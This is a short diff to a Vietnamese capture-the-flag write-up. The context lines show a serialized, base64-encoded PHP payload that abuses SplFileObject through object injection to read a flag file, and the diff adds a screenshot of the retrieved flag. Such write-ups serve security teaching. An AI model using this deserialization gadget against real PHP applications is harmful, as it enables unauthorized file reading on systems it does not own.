@@ -114,3 +114,10 @@ $m -> param = "./ahyeah_flag_here_cat_me_plss/flag.php";
 #echo serialize(array(1 => $m, 2 => 2));
 echo base64_encode('a:2:{i:1;O:4:"main":2:{s:5:"class";O:10:"do_nothing":2:{s:1:"a";i:1;s:1:"b";s:13:"SplFileObject";}s:5:"param";s:39:"./ahyeah_flag_here_cat_me_plss/flag.php";}i:1;i:2;}');
 ```
+
+Và flag:
+
+![flag](https://user-images.githubusercontent.com/77546253/176494329-01527b07-18fa-490a-afb5-cf870b17d0d3.png)
+
+
+
